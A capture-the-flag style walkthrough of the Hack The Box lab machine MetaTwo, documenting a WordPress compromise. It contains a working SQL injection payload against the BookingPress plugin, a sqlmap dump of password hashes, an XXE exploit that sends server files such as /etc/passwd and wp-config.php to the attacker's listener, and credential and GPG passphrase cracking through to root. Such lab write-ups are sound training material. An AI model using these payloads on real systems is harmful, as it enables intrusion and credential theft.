---
created: 2025-09-04
---

📅 `2025-09-04`

#wordpress #cve #sql-injection #xxe #ftp #installed-software

----

## 🖥️ Box Info

| ️🏷️ Name         |  `MetaTwo`   |
| --------------- | --- |
| 📆 Release Date |  `2022-10-29`   |
| 🌐 IP Address   |   `10.10.11.186`  |
| 🖥️ OS           |   `Linux`  |
| 🎯 Difficulty   |  `Easy`   |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- `WordPress` `CVE`s
- `SQLi`
- `FTP` credentialed login
- `passpie` password manager

**🛠️ Tools:**  

- `wpscan`
- `sqlmap`
- `john`

**📚 Learned:**  

- Try reading `wp-config.php` or `../wp-config.php` with `LFI` or `XXE`.
- Enumerate plugins manually too; don't trust `wpscan` blindly. We can try the `--plugins-detection mixed` option for `wpscan` to find plugins passively as well as aggressively.
- Use `sqlmap` with a request file both to find `SQL` injection and to automate exploiting it.
- If `hashcat` fails, try `john`.
- Don't sleep on `john`, it's a great tool.
- `wp-config.php` can contain passwords for the database and `FTP`. We should read it if we get a vulnerability that lets us read files.
- Try to leverage installed software, like password managers.
- Learned to crack `GPG` private keys.
- The hidden files and folders in the user's home directory can also reveal important installed software.

----

## 🌐 Port Scan

- **TCP**: 21, 22, 80
- **UDP**: None

---

## 🔍 Enumeration

The website looks like a blog under construction that has a feature to schedule a notification. This has to be some plugin. `wpscan` didn't find any plugins, so I used the `--plugins-detection mixed` option to find all the plugins by using brute-force as well as passive methods.

I ended up using `curl`, making a request to the `/events` endpoint since that's where the functionality was.

```shell
curl 'http://metapress.htb/events/' | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*'

http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10' media='all' />
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10' media='all' />
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_front.css?ver=1.0.10' media='all' />
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_tel_input.css?ver=1.0.10' media='all' />
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_vue_calendar.css?ver=1.0.10' media='all' />
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_vue.min.js?ver=1.0.10' id='bookingpress_vue_js-js'></script>
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_axios.min.js?ver=1.0.10' id='bookingpress_axios_js-js'></script>
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_wordpress_vue_qs_helper.js?ver=1.0.10' id='bookingpress_wordpress_vue_helper_js-js'></script>
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_element.js?ver=1.0.10' id='bookingpress_element_js-js'></script>
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_vue_calendar.js?ver=1.0.10' id='bookingpress_calendar_js-js'></script>
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_moment.min.js?ver=1.0.10' id='bookingpress_moment_js-js'></script>
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_tel_input.js?ver=1.0.10' id='bookingpress_tel_input_js-js'></script>
'http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_element_en.js?ver=1.0.10' id='bookingpress_element_en_js-js'></script>
"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/front-summary-vector.svg" alt="">
"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/front-paypal-symbol.svg" alt=""></span>
						<source srcset="http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/data-grid-empty-view-vector.webp" type="image/webp">
"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/data-grid-empty-view-vector.png
```

This revealed the plugin `bookingpress` version `1.0.10`, so I searched for vulnerabilities.

I found this one:

![[Pasted image 20250904031608.png]]

I tested the vulnerability with `curl` and it worked.

```shell
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=71001e6e7c&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080

[
    {
        "bookingpress_service_id": "10.5.15-MariaDB-0+deb11u1",
        "bookingpress_category_id": "Debian 11",
        "bookingpress_service_name": "debian-linux-gnu",
        "bookingpress_service_price": "$1.00",
        "bookingpress_service_duration_val": "2",
        "bookingpress_service_duration_unit": "3",
        "bookingpress_service_description": "4",
        "bookingpress_service_position": "5",
        "bookingpress_servicedate_created": "6",
        "service_price_without_currency": 1,
        "img_url": "http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"
    }
]
```

>[!tip]
>I sent the request to `127.0.0.1:8080` to play around with the payload from `Caido`.



---

## 🪜 Foothold / User

After a few manual attempts, I switched to `sqlmap`. I ended up with this command:

```shell
sqlmap -r req.txt --batch --random-agent --dbms mysql -p total_service --prefix ')' --dump -T wp_users -D blog

+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
```

It dumped the password hashes for user `admin` and user `manager`.

>[!tip]
>The only databases were `information_schema` and `blog`. I assumed `blog` had more interesting information.

I tried using `hashcat` for both hashes, but neither cracked, so I tried `john`, which cracked `manager`'s.

```shell
john --wordlist=$ROCKYOU ./hash.txt
partylikearockstar
```

>[!tip]
>Use both tools if a problem like this comes up.

Creds:

- `manager`:`partylikearockstar`

This was from the table of the `WordPress` `CMS` itself, and I still tried it with `SSH` and `FTP` in case `manager` reused the password, but it didn't work. Let's log into `WordPress`.

![[Pasted image 20250904030944.png]]

This account has no administrative rights over the `CMS`, so doing the typical `PHP` file reverse shell was not an option. Since the output from `wpscan` was quite large, I decided to look for authenticated vulnerabilities.

I found `CVE-2021-29447` in the output of `wpscan`: an `XXE` vulnerability. I can use this to extract files and get credentials. I thought the next step had to do with the `FTP` service, since it was running and didn't have anonymous access enabled. If I could find the credentials, there might be something interesting in the folders shared by `FTP`. First, I extracted `/etc/passwd` to find users.

[Here](https://raw.githubusercontent.com/0xRar/CVE-2021-29447-PoC/refs/heads/main/PoC.py) is the link for the exploit. It generates a malicious `.wav` file that we have to upload manually.

![[Pasted image 20250904161637.png]]

The exploit starts a web server, which gets a request with the contents of the file we asked for as the value of the `p` parameter. I created a simple `decode.py` file to decode it.

```python
import argparse
import base64
import zlib

parser = argparse.ArgumentParser()
parser.add_argument("-s", type=str, required=True)

args = parser.parse_args()

data = args.s

compressed = base64.b64decode(data)
original = zlib.decompress(compressed, -15)  # -15 for raw DEFLATE
print(original.decode(errors="ignore"))
```


```shell
python exploit.py -l 10.10.14.11 -f /etc/passwd -p 8001

python decode.py -s jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw==
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

That revealed user `jnelson`. Next, I looked for credentials for the `FTP` server.

I tried `/etc/proftpd/proftpd.conf` and `/etc/proftpd.conf`. They didn't exist. I read that the `wp-config.php` file could also have `FTP` credentials, so I tried `/var/www/html/wp-config.php` and `/var/www/html/blog/wp-config.php`, but they didn't exist. I ended up trying `../wp-config.php` and it worked.

```
python decode.py -s jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw==
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
<SNIP>
```

We got the following `FTP` credentials.

- `metapress.htb`:`9NYS_ii@FyL_p5M2NvJ`

I tried that password for `jnelson` over `SSH` but it didn't work (always check password reuse). I decided to log into the `FTP` service.

```shell
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (10.10.11.186:asdf): metapress.htb
331 Password required for metapress.htb
Password: 
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||27175|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
226 Transfer complete
```

These two folders were quite large and looked like the blog's web root.

After checking some files, I tried getting the file `send_email.php` from the `mailer` folder and I found this:

```php
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   
```

It contains a password for `jnelson`, so I tried it over `SSH`.

- `jnelson`:`Cb4_JmWM8zUZWMu@Ys`

```shell
ssh jnelson@metapress.htb
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 25 12:51:26 2022 from 10.10.14.23
jnelson@meta2:~$ id
uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)

jnelson@meta2:~$ ls
user.txt
```

Got user.

---

## 🛡️ Privilege Escalation

`Dirty Pipe` didn't work.

Further enumeration revealed the password manager `passpie`. I read its documentation and it requires a master password. Let's list the saved passwords.

```shell
jnelson@meta2:~$ passpie list

╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
```

So we have the root password in the password manager. The path to root clearly went through this password manager. I tried searching for files containing credentials using `find` and found some passwords but none of them worked. I even tried using `jnelson`'s password but it didn't work. The last option was to crack the `GPG` key's passphrase, which is the master password.

```shell
jnelson@meta2:~$ ls -la .passpie

dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 5 jnelson jnelson 4096 Sep  5 02:19 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 ssh
```

In the `.keys` file, there is the private `GPG` key that can be cracked to obtain the master password.

The `.keys` file had these contents:

```
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
fo6KI+w2uXLaw+bIT1XZurDN
=dqsF
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

I only needed the `PGP` private key, so I copied it to a file on my local machine called `gpg.txt`, including the newline at the beginning. The key must not be altered.

I used the tool `gpg2john` to get it into a format readable by `john`.

```shell
asdf>> gpg2john gpg.txt > hash.txt
```

And then cracked it:

```shell
asdf>> john --wordlist=$ROCKYOU ./hash.txt
blink182         (Passpie)     
```

The master password was `blink182`. I exported the passwords in plain text with the `export <file>` subcommand:

```shell
jnelson@meta2:~$ passpie export test
Passphrase: 
jnelson@meta2:~$ ls
test  user.txt
jnelson@meta2:~$ cat test
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

Got the root password: `p7qfAZt4_A1xo_0x`.

```shell
jnelson@meta2:~/.passpie$ su -
Password: 
root@meta2:~# ls
restore  root.txt
```

Rooted.
